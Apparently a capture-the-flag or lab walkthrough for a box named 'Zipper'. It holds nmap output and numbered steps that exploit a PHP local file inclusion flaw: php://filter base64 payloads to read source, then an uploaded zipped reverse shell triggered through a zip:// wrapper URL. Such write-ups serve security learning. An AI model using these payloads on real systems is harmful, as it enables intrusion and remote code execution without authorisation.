
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Zipper
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

port 80 Zipper possible LFI 
**Decode the base64**

1. clicked on home (top left) gave us a parameter 
2. php://filter/convert.base64-encode/resource=index -> used to identify that its appending the .php file extension to each upload 
3. php://filter/convert.base64-encode/resource=home -> tell us that theres a upload.php directory 
4. php://filter/convert.base64-encode/resource=upload -> tell us about the exact directory
5. upload the php-reverse-shell.php -> re download it to get the id of the file
6. TARGET/index.php?file=zip://uploads/upload_1711002348.zip%23php-reverse-shell-linux -> to trigger the reverse shell 
7. dont put .php at the end 
